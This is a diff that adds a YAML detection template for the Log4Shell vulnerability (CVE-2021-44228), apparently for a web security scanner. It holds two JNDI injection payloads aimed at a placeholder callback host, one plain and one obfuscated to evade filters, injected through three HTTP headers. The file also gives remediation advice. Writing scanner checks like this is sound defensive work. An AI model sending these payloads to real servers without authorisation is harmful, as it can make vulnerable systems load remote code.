@@ -1,0 +1,20 @@
+# Log4Shell detection
+metadata:
+  name: Log4Shell (CVE-2021-44228)
+  description: Tests for Log4j JNDI injection via headers with OOB callback detection.
+  author: BurpFree
+  version: "1.0"
+  tags: [active, log4shell, injection]
+severity: critical
+confidence: tentative
+type: active
+injection_points:
+  - header: User-Agent
+  - header: X-Forwarded-For
+  - header: Referer
+payloads:
+  - value: "${jndi:ldap://COLLABORATOR/a}"
+    oob: true
+  - value: "${${lower:j}ndi:${lower:l}dap://COLLABORATOR/a}"
+    oob: true
+remediation: Update Log4j to 2.17.0+. Set log4j2.formatMsgNoLookups=true.
